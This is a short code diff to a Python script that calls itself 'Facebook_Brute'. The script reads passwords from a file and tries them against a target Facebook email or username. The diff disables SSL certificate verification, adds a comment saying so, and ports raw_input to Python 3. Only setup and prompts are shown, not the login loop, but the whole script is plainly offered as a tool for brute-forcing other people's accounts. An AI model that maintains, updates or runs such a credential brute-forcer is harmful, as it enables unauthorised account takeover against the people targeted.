@@ -24,12 +24,13 @@ except ImportError:
     print('\n\tPlease install mechanize.\n')
     sys.exit()
 
+# Disable SSL certificate verification
 ssl._create_default_https_context = ssl._create_unverified_context
 
 print('\n-----v1.1.3-----Welcome To Facebook_Brute-----Coded:Vicky-----\n')
 file = open('passwords.txt', 'r')
 
-email = str(raw_input('Enter Email/Username: ').strip())
+email = str(input('Enter Email/Username: ').strip())
 
 print("\nTarget Email ID:", email)
 print("\nTrying Passwords from the list...")
